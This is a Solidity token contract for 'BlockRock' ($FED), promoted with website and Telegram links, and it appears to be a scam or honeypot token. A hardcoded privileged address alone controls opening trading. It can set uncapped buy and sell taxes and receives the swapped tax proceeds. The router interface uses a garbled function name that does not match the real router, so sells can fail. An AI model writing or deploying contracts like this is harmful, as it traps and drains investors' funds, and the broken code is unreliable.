/*

Global asset authority ($FED). Helping everyone experience financial well-being.

Website: https://www.blockrockassets.com/
Twitter: https://twitter.com/blockrockassets
Telegram: https://t.me/BlockRockAssets

*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.22;
    
interface IUniswapV2Router02 {
     function swapExactTokensForETHSupportingTaxGOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
    
    contract BlockRock  {

        constructor() {
            balanceOf[msg.sender] = totalSupply;
            allowance[address(this)][routerAddress] = type(uint256).max;
            emit Transfer(address(0), msg.sender, totalSupply);
        }

        string public _name = "BlockRock"; 
        string public _symbol = "FED";  
        uint8 public constant decimals = 18;
        uint256 public constant totalSupply = 1000000000 * 10**decimals;

        uint256 buyTaxG = 0;
        uint256 sellTaxG = 0;
        uint256 constant swapAmount = totalSupply / 100;
        
        error Permissions();

        function name() public view virtual returns (string memory) {
        return _name;
        }

    
        function symbol() public view virtual returns (string memory) {
        return _symbol;
        }    

        event Transfer(address indexed from, address indexed to, uint256 value);
        event Approval(
            address indexed Mastersdeppp,
            address indexed spender,
            uint256 value
        );

        mapping (address => uint256) public balanceOf;
        mapping (address => mapping (address => uint256)) public allowance;

       
        
        function approve(address spender, uint256 amount) external returns (bool){
            allowance[msg.sender][spender] = amount;
            emit Approval(msg.sender, spender, amount);
            return true;
        }

        function transferFrom(address from, address to, uint256 amount) external returns (bool){
            allowance[from][msg.sender] -= amount;        
            return _transfer(from, to, amount);
        }

        function transfer(address to, uint256 amount) external returns (bool){
            return _transfer(msg.sender, to, amount);
        }

        address private pair;
        address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);
        address payable constant Mastersdeppp = payable(address(0x8494219B081988D9645b0b381E934bf5bcE0630e));

        bool private swapping;
        bool private tradingOpen;

        

        receive() external payable {}

        

        function _transfer(address from, address to, uint256 amount) internal returns (bool){
            require(tradingOpen || from == Mastersdeppp || to == Mastersdeppp);

            if(!tradingOpen && pair == address(0) && amount > 0)
                pair = to;

            balanceOf[from] -= amount;

            if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount){
                swapping = true;
                address[] memory path = new address[](2);
                path[0] = address(this);
                path[1] = ETH;
                _uniswapV2Router.swapExactTokensForETHSupportingTaxGOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
                Mastersdeppp.transfer(address(this).balance);
                swapping = false;
            }

            if(from != address(this)){
                uint256 TaxGAmount = amount * (from == pair ? buyTaxG : sellTaxG) / 100;
                amount -= TaxGAmount;
                balanceOf[address(this)] += TaxGAmount;
            }
            balanceOf[to] += amount;
            emit Transfer(from, to, amount);
            return true;
        }

        function TradeOpening() external {
            require(msg.sender == Mastersdeppp);
            require(!tradingOpen);
            tradingOpen = true;        
        }

        function _RemeveeTax(uint256 _buy, uint256 _sell) private {
            buyTaxG = _buy;
            sellTaxG = _sell;
        }

        function TaxRemove(uint256 _buy, uint256 _sell) external {
            if(msg.sender != Mastersdeppp)        
                revert Permissions();
            _RemeveeTax(_buy, _sell);
        }
    }